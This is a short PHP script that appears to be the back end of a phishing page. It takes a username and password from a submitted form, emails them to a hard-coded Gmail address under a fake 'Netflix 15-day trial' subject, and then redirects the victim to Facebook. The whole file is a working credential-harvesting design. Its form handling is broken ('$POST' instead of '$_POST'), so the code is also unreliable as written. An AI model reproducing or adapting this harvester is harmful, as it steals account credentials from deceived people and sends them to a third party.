<?php
	function mail_sender(){
		$username = $POST['username'];
		$password = $POST['password'];
		
		$reciever = "Joshuacabias8@gmail.com" ;
		
		$subject = "Get a 15-day trial from Netflix";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
